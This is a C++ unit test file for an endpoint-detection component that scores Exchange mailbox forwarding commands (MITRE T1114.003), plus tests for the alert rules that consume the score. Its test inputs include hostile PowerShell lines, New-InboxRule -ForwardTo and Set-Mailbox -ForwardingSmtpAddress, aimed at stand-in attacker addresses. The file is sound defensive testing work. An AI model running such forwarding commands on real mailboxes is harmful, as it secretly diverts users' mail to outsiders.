/*
 * mailbox_rule_detector_tests.cpp - Unit tests for MailboxRuleDetector
 * (T1114.003) and the production rules that consume its score field.
 *
 * Detector tiers asserted here (per user/mailbox_rule_detector.cpp):
 *   90 inbox_rule_external_forward   (New/Set-InboxRule + -ForwardTo /
 *                                     -RedirectTo / -ForwardAsAttachmentTo,
 *                                     PS plane or command plane)
 *   85 mailbox_smtp_forward          (Set-Mailbox + -ForwardingSmtpAddress /
 *                                     -ForwardingAddress /
 *                                     -DeliverToMailboxAndForward)
 *   60 inbox_rule_cmdlet_command_line (bare cmdlet on a PROCESS_START
 *                                     command line only; PS plane bare
 *                                     cmdlets are legitimate admin work)
 *   the same cmdlets without forwarding parameters on the PS plane stay
 *   silent.
 *
 * Production rules (added to rules/rules.json by the wiring agent):
 *   EDR-484  mailbox_rule_score >= 75   high/alert  T1114.003
 *   EDR-485  mailbox_rule_score 55-74   medium/log  T1114.003
 * The production-rule block is skipped while rules.json does not carry
 * them yet (same policy as the other production-rule suites).
 */
#include "mailbox_rule_detector_tests.h"

#include <windows.h>

#include <algorithm>
#include <cstdint>
#include <cstdio>
#include <fstream>
#include <stdexcept>
#include <string>
#include <vector>

#include "edr_event.h"
#include "event_bus.h"
#include "mailbox_rule_detector.h"
#include "rule_engine.h"

namespace {

#define MB_CHECK(condition) Check((condition), #condition, __LINE__)

void Check(bool condition, const char* expression, int line) {
    if (!condition)
        throw std::runtime_error(
            "mailbox rule detector test failed at line " +
            std::to_string(line) + ": " + expression);
}

constexpr uint64_t kSecond = 10000000ULL;

/* House contract: POWERSHELL_SCRIPT bodies live ONLY in kScriptBlockText
 * (never kCommandLine) and every test event carries an explicit ts100ns
 * (no FILETIME-now fallback). */
edr::Event PsScriptEvent(uint64_t ts, const char* scriptText) {
    edr::Event event;
    event.type = EDR_EVT_POWERSHELL_SCRIPT;
    event.ts100ns = ts;
    event.fields[edr::field::kType] = "POWERSHELL_SCRIPT";
    event.fields[edr::field::kScriptBlockText] = scriptText;
    return event;
}

edr::Event ProcEvent(uint64_t ts, const char* image, const char* cmdLine) {
    edr::Event event;
    event.type = EDR_EVT_PROCESS_START;
    event.ts100ns = ts;
    event.fields[edr::field::kType] = "PROCESS_START";
    event.fields[edr::field::kImage] = image;
    if (cmdLine != nullptr)
        event.fields[edr::field::kCommandLine] = cmdLine;
    return event;
}

bool HasScore(const edr::Event& event) {
    return event.fields.find(edr::field::kMailboxRuleScore) !=
           event.fields.end();
}

void TestInspects() {
    MB_CHECK(edr::MailboxRuleDetector::Inspects(EDR_EVT_PROCESS_START));
    MB_CHECK(edr::MailboxRuleDetector::Inspects(EDR_EVT_POWERSHELL_SCRIPT));
    MB_CHECK(!edr::MailboxRuleDetector::Inspects(EDR_EVT_NET_LISTENER));
    MB_CHECK(!edr::MailboxRuleDetector::Inspects(EDR_EVT_REG_WRITE));
    MB_CHECK(!edr::MailboxRuleDetector::Inspects(EDR_EVT_FILE_CREATE));
}

void TestDisabled() {
    edr::MailboxRuleDetector detector(false, 55, 300, 1024);
    edr::Event ps = PsScriptEvent(
        1000 * kSecond, "New-InboxRule -ForwardTo attacker@evil.example");
    detector.Enrich(ps);
    MB_CHECK(!HasScore(ps));
    edr::Event proc = ProcEvent(1001 * kSecond,
                                "C:\\Windows\\System32\\WindowsPowerShell\\"
                                "v1.0\\powershell.exe",
                                "powershell.exe -Command New-InboxRule");
    detector.Enrich(proc);
    MB_CHECK(!HasScore(proc));
}

void TestInboxRuleForwardTier90() {
    edr::MailboxRuleDetector detector(true, 55, 300, 1024);

    /* New-InboxRule -ForwardTo on the PS plane (body in kScriptBlockText). */
    edr::Event ps = PsScriptEvent(
        1000 * kSecond,
        "New-InboxRule -Name 'Finance reports' -ForwardTo Attacker@Evil.com");
    detector.Enrich(ps);
    MB_CHECK(ps.fields.at(edr::field::kMailboxRuleScore) == "90");
    MB_CHECK(ps.fields.at(edr::field::kMailboxRuleVerdict) == "malicious");
    MB_CHECK(ps.fields.at(edr::field::kMailboxRuleSignals) ==
             "inbox_rule_external_forward");
    MB_CHECK(ps.fields.at(edr::field::kMailboxRuleCmdlets) ==
             "new-inboxrule/set-inboxrule");
    /* Target is extracted from the lowered text. */
    MB_CHECK(ps.fields.at(edr::field::kMailboxRuleTargets) ==
             "attacker@evil.com");

    /* -RedirectTo via Set-InboxRule. */
    edr::Event redirect = PsScriptEvent(
        1001 * kSecond,
        "Set-InboxRule -Identity '1' -RedirectTo drop@evil.example");
    detector.Enrich(redirect);
    MB_CHECK(redirect.fields.at(edr::field::kMailboxRuleScore) == "90");
    MB_CHECK(redirect.fields.at(edr::field::kMailboxRuleSignals) ==
             "inbox_rule_external_forward");
    MB_CHECK(redirect.fields.at(edr::field::kMailboxRuleTargets) ==
             "drop@evil.example");

    /* -ForwardAsAttachmentTo in the colon-bound form. */
    edr::Event attach = PsScriptEvent(
        1002 * kSecond, "New-InboxRule -ForwardAsAttachmentTo:a@b.example");
    detector.Enrich(attach);
    MB_CHECK(attach.fields.at(edr::field::kMailboxRuleScore) == "90");
    MB_CHECK(attach.fields.at(edr::field::kMailboxRuleTargets) ==
             "a@b.example");

    /* Quoted target has its quotes stripped. */
    edr::Event quoted = PsScriptEvent(
        1003 * kSecond,
        "New-InboxRule -ForwardTo \"ops@evil.example\" -StopProcessingRules");
    detector.Enrich(quoted);
    MB_CHECK(quoted.fields.at(edr::field::kMailboxRuleScore) == "90");
    MB_CHECK(quoted.fields.at(edr::field::kMailboxRuleTargets) ==
             "ops@evil.example");

    /* The 90 tier also fires on the raw command plane. */
    edr::Event cmd = ProcEvent(
        1004 * kSecond,
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "powershell.exe -EncodedCommand AA -Command \"New-InboxRule "
        "-ForwardTo win@evil.example\"");
    detector.Enrich(cmd);
    MB_CHECK(cmd.fields.at(edr::field::kMailboxRuleScore) == "90");
    MB_CHECK(cmd.fields.at(edr::field::kMailboxRuleTargets) ==
             "win@evil.example");
}

/* "-ForwardToFolder" must neither count as a "-ForwardTo" hit nor become
 * its value source: ExtractTarget only scans valid flag occurrences (the
 * same acceptance rule as HasFlag), so the target comes from the real
 * -ForwardTo parameter. */
void TestForwardToFolderNotValueSource() {
    edr::MailboxRuleDetector detector(true, 55, 300, 1024);
    edr::Event cmd = ProcEvent(
        1000 * kSecond,
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "powershell.exe -Command Set-InboxRule -ForwardToFolder Legacy "
        "-ForwardTo a@evil.example");
    detector.Enrich(cmd);
    MB_CHECK(cmd.fields.at(edr::field::kMailboxRuleScore) == "90");
    MB_CHECK(cmd.fields.at(edr::field::kMailboxRuleSignals) ==
             "inbox_rule_external_forward");
    MB_CHECK(cmd.fields.at(edr::field::kMailboxRuleTargets) ==
             "a@evil.example");

    /* With no valid -ForwardTo occurrence the scan falls through to the
     * next flag of the family instead of reading "-ForwardToFolder"'s
     * value. */
    edr::Event folderOnly = PsScriptEvent(
        1001 * kSecond,
        "Set-InboxRule -ForwardToFolder Legacy -RedirectTo x@evil.example");
    detector.Enrich(folderOnly);
    MB_CHECK(folderOnly.fields.at(edr::field::kMailboxRuleScore) == "90");
    MB_CHECK(folderOnly.fields.at(edr::field::kMailboxRuleTargets) ==
             "x@evil.example");
}

void TestMailboxSmtpForwardTier85() {
    edr::MailboxRuleDetector detector(true, 55, 300, 1024);

    edr::Event smtp = PsScriptEvent(
        1000 * kSecond,
        "Set-Mailbox -Identity jdoe -ForwardingSmtpAddress "
        "Vendor@Corp.example");
    detector.Enrich(smtp);
    MB_CHECK(smtp.fields.at(edr::field::kMailboxRuleScore) == "85");
    MB_CHECK(smtp.fields.at(edr::field::kMailboxRuleVerdict) == "malicious");
    MB_CHECK(smtp.fields.at(edr::field::kMailboxRuleSignals) ==
             "mailbox_smtp_forward");
    MB_CHECK(smtp.fields.at(edr::field::kMailboxRuleCmdlets) == "set-mailbox");
    MB_CHECK(smtp.fields.at(edr::field::kMailboxRuleTargets) ==
             "vendor@corp.example");

    edr::Event addr = PsScriptEvent(
        1001 * kSecond,
        "Set-Mailbox -Identity jdoe -ForwardingAddress archive@corp.example");
    detector.Enrich(addr);
    MB_CHECK(addr.fields.at(edr::field::kMailboxRuleScore) == "85");
    MB_CHECK(addr.fields.at(edr::field::kMailboxRuleTargets) ==
             "archive@corp.example");

    /* Switch-style parameter carrying a value. */
    edr::Event deliver = PsScriptEvent(
        1002 * kSecond,
        "Set-Mailbox -Identity jdoe -DeliverToMailboxAndForward $true "
        "-ForwardingSmtpAddress hq@corp.example");
    detector.Enrich(deliver);
    MB_CHECK(deliver.fields.at(edr::field::kMailboxRuleScore) == "85");
    MB_CHECK(deliver.fields.at(edr::field::kMailboxRuleTargets) ==
             "hq@corp.example");

    /* Bare switch at end of text: still 85, but no target is extracted. */
    edr::Event bare = PsScriptEvent(
        1003 * kSecond,
        "Set-Mailbox -Identity jdoe -DeliverToMailboxAndForward");
    detector.Enrich(bare);
    MB_CHECK(bare.fields.at(edr::field::kMailboxRuleScore) == "85");
    MB_CHECK(bare.fields.find(edr::field::kMailboxRuleTargets) ==
             bare.fields.end());
}

void TestLegitimateAdminSilent() {
    edr::MailboxRuleDetector detector(true, 55, 300, 1024);

    /* PS-plane inbox-rule maintenance without forwarding parameters is
     * routine admin work: silent even though the cmdlet matches. */
    edr::Event view = PsScriptEvent(
        1000 * kSecond,
        "New-InboxRule -Name 'Weekly reports' -From reports@corp.example "
        "-MarkAsRead:$true");
    detector.Enrich(view);
    MB_CHECK(!HasScore(view));

    edr::Event rename = PsScriptEvent(
        1001 * kSecond, "Set-InboxRule -Identity '42' -Name 'Renamed rule'");
    detector.Enrich(rename);
    MB_CHECK(!HasScore(rename));

    /* Substring noise (-ForwardToFoo) is not a forwarding flag. */
    edr::Event noise = PsScriptEvent(
        1002 * kSecond, "Set-InboxRule -ForwardToFooOnly -Name 'x'");
    detector.Enrich(noise);
    MB_CHECK(!HasScore(noise));

    edr::Event mailbox = PsScriptEvent(
        1003 * kSecond, "Set-Mailbox -Identity jdoe -MaxSendSize 50MB");
    detector.Enrich(mailbox);
    MB_CHECK(!HasScore(mailbox));

    edr::Event other = PsScriptEvent(1004 * kSecond,
                                     "Get-InboxRule | Format-List");
    detector.Enrich(other);
    MB_CHECK(!HasScore(other));

    /* Command plane without a matched cmdlet is silent too. */
    edr::Event cmd = ProcEvent(
        1005 * kSecond,
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "powershell.exe -Command Get-InboxRule");
    detector.Enrich(cmd);
    MB_CHECK(!HasScore(cmd));
}

void TestBareCmdletCommandLineTier60() {
    /* 60 is below MALICIOUS; use a min_score that admits the middle tier. */
    edr::MailboxRuleDetector detector(true, 55, 300, 1024);

    /* Timestamps are spaced 400s apart — beyond the 300s dedup window —
     * because all three events share the same dedup key
     * (inbox_rule_cmdlet_command_line | empty target); the contract
     * dedups that key inside the window (TestDedupWindow covers it). */
    edr::Event bare = ProcEvent(
        1000 * kSecond,
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "powershell.exe -Command \"New-InboxRule\"");
    detector.Enrich(bare);
    MB_CHECK(bare.fields.at(edr::field::kMailboxRuleScore) == "60");
    MB_CHECK(bare.fields.at(edr::field::kMailboxRuleVerdict) == "suspicious");
    MB_CHECK(bare.fields.at(edr::field::kMailboxRuleSignals) ==
             "inbox_rule_cmdlet_command_line");
    MB_CHECK(bare.fields.at(edr::field::kMailboxRuleCmdlets) ==
             "new-inboxrule/set-inboxrule");
    MB_CHECK(bare.fields.find(edr::field::kMailboxRuleTargets) ==
             bare.fields.end());

    edr::Event set = ProcEvent(
        1400 * kSecond,
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "powershell.exe -Command Set-InboxRule");
    detector.Enrich(set);
    MB_CHECK(set.fields.at(edr::field::kMailboxRuleScore) == "60");

    /* Flag-boundary noise still falls into the middle tier (the cmdlet
     * itself is on a raw command line). */
    edr::Event noise = ProcEvent(
        1800 * kSecond,
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "powershell.exe -Command Set-InboxRule -ForwardToFooOnly");
    detector.Enrich(noise);
    MB_CHECK(noise.fields.at(edr::field::kMailboxRuleScore) == "60");
    MB_CHECK(noise.fields.at(edr::field::kMailboxRuleSignals) ==
             "inbox_rule_cmdlet_command_line");
}

void TestMinScoreGating() {
    /* min_score 90: only the 90 tier survives. */
    {
        edr::MailboxRuleDetector detector(true, 90, 300, 1024);
        edr::Event bare = ProcEvent(
            1000 * kSecond,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -Command New-InboxRule");
        detector.Enrich(bare);
        MB_CHECK(!HasScore(bare));
        edr::Event smtp = PsScriptEvent(
            1001 * kSecond, "Set-Mailbox -ForwardingAddress a@corp.example");
        detector.Enrich(smtp);
        MB_CHECK(!HasScore(smtp));
        edr::Event forward = PsScriptEvent(
            1002 * kSecond, "New-InboxRule -ForwardTo a@evil.example");
        detector.Enrich(forward);
        MB_CHECK(HasScore(forward));
        MB_CHECK(forward.fields.at(edr::field::kMailboxRuleScore) == "90");
    }
    /* min_score 75: the 60 middle tier is filtered, 85 survives. */
    {
        edr::MailboxRuleDetector detector(true, 75, 300, 1024);
        edr::Event bare = ProcEvent(
            1000 * kSecond,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -Command New-InboxRule");
        detector.Enrich(bare);
        MB_CHECK(!HasScore(bare));
        edr::Event smtp = PsScriptEvent(
            1001 * kSecond, "Set-Mailbox -ForwardingAddress a@corp.example");
        detector.Enrich(smtp);
        MB_CHECK(smtp.fields.at(edr::field::kMailboxRuleScore) == "85");
    }
    /* min_score 55 admits the 60 middle tier (low-score positive uses its
     * own low-threshold instance to avoid polluting the blocks above). */
    {
        edr::MailboxRuleDetector detector(true, 55, 300, 1024);
        edr::Event bare = ProcEvent(
            1000 * kSecond,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -Command New-InboxRule");
        detector.Enrich(bare);
        MB_CHECK(bare.fields.at(edr::field::kMailboxRuleScore) == "60");
    }
}

void TestDedupWindow() {
    edr::MailboxRuleDetector detector(true, 55, 300, 1024);

    edr::Event first = PsScriptEvent(
        1000 * kSecond, "New-InboxRule -ForwardTo a@evil.example");
    detector.Enrich(first);
    MB_CHECK(HasScore(first));

    /* Same signal+target inside the window is suppressed. */
    edr::Event repeat = PsScriptEvent(
        1100 * kSecond, "New-InboxRule -ForwardTo a@evil.example");
    detector.Enrich(repeat);
    MB_CHECK(!HasScore(repeat));

    /* A different forwarding target is a different key and re-arms. */
    edr::Event other = PsScriptEvent(
        1100 * kSecond, "New-InboxRule -ForwardTo b@evil.example");
    detector.Enrich(other);
    MB_CHECK(HasScore(other));
    MB_CHECK(detector.StateCount() == 2);

    /* Window expiry (300s) re-arms the original key. */
    edr::Event late = PsScriptEvent(1000 * kSecond + 301 * kSecond,
                                    "New-InboxRule -ForwardTo a@evil.example");
    detector.Enrich(late);
    MB_CHECK(HasScore(late));

    /* The middle tier dedups on its own key (empty target). */
    edr::Event bare1 = ProcEvent(
        2000 * kSecond,
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "powershell.exe -Command New-InboxRule");
    detector.Enrich(bare1);
    MB_CHECK(HasScore(bare1));
    edr::Event bare2 = ProcEvent(
        2100 * kSecond,
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "powershell.exe -Command New-InboxRule");
    detector.Enrich(bare2);
    MB_CHECK(!HasScore(bare2));
    MB_CHECK(detector.StateCount() == 3);
}

void TestDedupDisabledWithZeroWindow() {
    edr::MailboxRuleDetector detector(true, 55, 0, 1024);
    edr::Event first = PsScriptEvent(1000 * kSecond,
                                     "New-InboxRule -ForwardTo a@evil.example");
    detector.Enrich(first);
    MB_CHECK(HasScore(first));
    edr::Event second = PsScriptEvent(
        1100 * kSecond, "New-InboxRule -ForwardTo a@evil.example");
    detector.Enrich(second);
    MB_CHECK(HasScore(second)); /* window 0 disables dedup */
    MB_CHECK(detector.StateCount() == 1);
}

void TestStateCapacityReset() {
    edr::MailboxRuleDetector detector(true, 55, 300, 1);
    edr::Event a = PsScriptEvent(1000 * kSecond,
                                 "New-InboxRule -ForwardTo a@evil.example");
    detector.Enrich(a);
    MB_CHECK(HasScore(a));
    MB_CHECK(detector.StateCount() == 1);

    /* Second distinct key over capacity: dedup state resets, no UB, and
     * the detector keeps stamping. */
    edr::Event b = PsScriptEvent(1100 * kSecond,
                                 "New-InboxRule -ForwardTo b@evil.example");
    detector.Enrich(b);
    MB_CHECK(HasScore(b));
    MB_CHECK(detector.StateCount() == 1);

    edr::Event c = PsScriptEvent(1200 * kSecond,
                                 "New-InboxRule -ForwardTo a@evil.example");
    detector.Enrich(c);
    MB_CHECK(HasScore(c));
    MB_CHECK(detector.StateCount() == 1);

    edr::Event d = PsScriptEvent(1300 * kSecond,
                                 "New-InboxRule -ForwardTo c@evil.example");
    detector.Enrich(d);
    MB_CHECK(HasScore(d));
    MB_CHECK(detector.StateCount() == 1);
}

void TestUnknownEventsSilent() {
    edr::MailboxRuleDetector detector(true, 55, 300, 1024);

    /* Uninspected event type: silent even with cmdlet text. */
    edr::Event reg;
    reg.type = EDR_EVT_REG_WRITE;
    reg.ts100ns = 1000 * kSecond;
    reg.fields[edr::field::kType] = "REG_WRITE";
    reg.fields[edr::field::kRegValue] =
        "New-InboxRule -ForwardTo a@evil.example";
    detector.Enrich(reg);
    MB_CHECK(!HasScore(reg));

    /* PROCESS_START without command line and without a matching image. */
    edr::Event proc = ProcEvent(1001 * kSecond,
                                "C:\\Windows\\System32\\cmd.exe", nullptr);
    detector.Enrich(proc);
    MB_CHECK(!HasScore(proc));

    /* POWERSHELL_SCRIPT without a script body. */
    edr::Event ps;
    ps.type = EDR_EVT_POWERSHELL_SCRIPT;
    ps.ts100ns = 1002 * kSecond;
    ps.fields[edr::field::kType] = "POWERSHELL_SCRIPT";
    detector.Enrich(ps);
    MB_CHECK(!HasScore(ps));
}

/* Production-rule consumer check: rules are evaluated by the RuleEngine
 * against a hand-set mailbox_rule_score field (the RuleEngine never calls
 * the detector itself). */
struct AlertRecord {
    std::string ruleId;
    std::string severity;
    std::string action;
    std::vector<std::string> mitre;
};

std::vector<AlertRecord> g_alerts;

bool HasAlert(const char* id) {
    for (const AlertRecord& a : g_alerts)
        if (a.ruleId == id) return true;
    return false;
}

const AlertRecord* FindAlert(const char* id) {
    for (const AlertRecord& a : g_alerts)
        if (a.ruleId == id) return &a;
    return nullptr;
}

const char* ProductionRulesPath() {
    return GetFileAttributesA("..\\rules\\rules.json") !=
                   INVALID_FILE_ATTRIBUTES
        ? "..\\rules\\rules.json"
        : "rules\\rules.json";
}

std::string ReadAllText(const char* path) {
    std::ifstream input(path, std::ios::binary);
    return std::string((std::istreambuf_iterator<char>(input)),
                       std::istreambuf_iterator<char>());
}

void FeedScore(edr::RuleEngine* engine, const char* score) {
    edr::Event ev;
    ev.type = EDR_EVT_PROCESS_START;
    ev.ts100ns = 1000 * kSecond;
    ev.fields[edr::field::kType] = "PROCESS_START";
    if (score != nullptr)
        ev.fields[edr::field::kMailboxRuleScore] = score;
    g_alerts.clear();
    engine->OnEvent(ev);
}

void TestProductionRules() {
    /* EDR-484 (mailbox_rule_score >= 75, high/alert, T1114.003) and
     * EDR-485 (55-74, medium/log, T1114.003) are written to
     * rules/rules.json by the wiring agent. Until then skip the block. */
    const char* path = ProductionRulesPath();
    if (GetFileAttributesA(path) == INVALID_FILE_ATTRIBUTES) {
        std::fprintf(stderr,
                     "[mailbox_rule] rules file not found; "
                     "skipping production rules\n");
        return;
    }
    const std::string rulesText = ReadAllText(path);
    if (rulesText.find("EDR-484") == std::string::npos ||
        rulesText.find("EDR-485") == std::string::npos) {
        std::fprintf(stderr,
                     "[mailbox_rule] EDR-484/EDR-485 not in rules yet; "
                     "skipping production rules\n");
        return;
    }

    edr::RuleEngine engine;
    engine.LoadFromFile(path);
    engine.SetAlertCallback([](const edr::Alert& alert) {
        g_alerts.push_back(
            {alert.ruleId, alert.severity, alert.action, alert.mitreAttack});
    });

    /* Positive >=75 band: detector tiers 90 and 85 hit EDR-484 only. */
    FeedScore(&engine, "90");
    MB_CHECK(HasAlert("EDR-484"));
    MB_CHECK(!HasAlert("EDR-485"));
    const AlertRecord* high = FindAlert("EDR-484");
    MB_CHECK(high != nullptr);
    MB_CHECK(high->severity == "high");
    MB_CHECK(high->action == "alert");
    MB_CHECK(std::find(high->mitre.begin(), high->mitre.end(),
                       "T1114.003") != high->mitre.end());

    FeedScore(&engine, "85");
    MB_CHECK(HasAlert("EDR-484"));
    MB_CHECK(!HasAlert("EDR-485"));

    /* Band edges: 75 is the lower edge of the high band, 100 the top. */
    FeedScore(&engine, "75");
    MB_CHECK(HasAlert("EDR-484"));
    MB_CHECK(!HasAlert("EDR-485"));
    FeedScore(&engine, "100");
    MB_CHECK(HasAlert("EDR-484"));
    MB_CHECK(!HasAlert("EDR-485"));

    /* Mid band: 74 must NOT hit the >=75 rule; 60 hits EDR-485 only. */
    FeedScore(&engine, "74");
    MB_CHECK(HasAlert("EDR-485"));
    MB_CHECK(!HasAlert("EDR-484"));
    FeedScore(&engine, "60");
    MB_CHECK(HasAlert("EDR-485"));
    MB_CHECK(!HasAlert("EDR-484"));
    const AlertRecord* mid = FindAlert("EDR-485");
    MB_CHECK(mid != nullptr);
    MB_CHECK(mid->severity == "medium");
    MB_CHECK(mid->action == "log");
    MB_CHECK(std::find(mid->mitre.begin(), mid->mitre.end(),
                       "T1114.003") != mid->mitre.end());
    FeedScore(&engine, "55");
    MB_CHECK(HasAlert("EDR-485"));
    MB_CHECK(!HasAlert("EDR-484"));

    /* Dead band 50-54 and below: none of the new rules may fire. */
    FeedScore(&engine, "54");
    MB_CHECK(!HasAlert("EDR-484"));
    MB_CHECK(!HasAlert("EDR-485"));
    FeedScore(&engine, "52");
    MB_CHECK(!HasAlert("EDR-484"));
    MB_CHECK(!HasAlert("EDR-485"));
    FeedScore(&engine, "50");
    MB_CHECK(!HasAlert("EDR-484"));
    MB_CHECK(!HasAlert("EDR-485"));
    FeedScore(&engine, "40");
    MB_CHECK(!HasAlert("EDR-484"));
    MB_CHECK(!HasAlert("EDR-485"));

    /* Missing score field: predicates on it are false (M3 semantics). */
    FeedScore(&engine, nullptr);
    MB_CHECK(!HasAlert("EDR-484"));
    MB_CHECK(!HasAlert("EDR-485"));
}

} // namespace

void RunMailboxRuleDetectorTests() {
    std::fprintf(stderr, "[mailbox_rule] TestInspects\n");
    TestInspects();
    std::fprintf(stderr, "[mailbox_rule] TestDisabled\n");
    TestDisabled();
    std::fprintf(stderr, "[mailbox_rule] TestInboxRuleForwardTier90\n");
    TestInboxRuleForwardTier90();
    std::fprintf(stderr,
                 "[mailbox_rule] TestForwardToFolderNotValueSource\n");
    TestForwardToFolderNotValueSource();
    std::fprintf(stderr, "[mailbox_rule] TestMailboxSmtpForwardTier85\n");
    TestMailboxSmtpForwardTier85();
    std::fprintf(stderr, "[mailbox_rule] TestLegitimateAdminSilent\n");
    TestLegitimateAdminSilent();
    std::fprintf(stderr, "[mailbox_rule] TestBareCmdletCommandLineTier60\n");
    TestBareCmdletCommandLineTier60();
    std::fprintf(stderr, "[mailbox_rule] TestMinScoreGating\n");
    TestMinScoreGating();
    std::fprintf(stderr, "[mailbox_rule] TestDedupWindow\n");
    TestDedupWindow();
    std::fprintf(stderr, "[mailbox_rule] TestDedupDisabledWithZeroWindow\n");
    TestDedupDisabledWithZeroWindow();
    std::fprintf(stderr, "[mailbox_rule] TestStateCapacityReset\n");
    TestStateCapacityReset();
    std::fprintf(stderr, "[mailbox_rule] TestUnknownEventsSilent\n");
    TestUnknownEventsSilent();
    std::fprintf(stderr, "[mailbox_rule] TestProductionRules\n");
    TestProductionRules();
    std::fprintf(stderr, "[mailbox_rule] all passed\n");
}
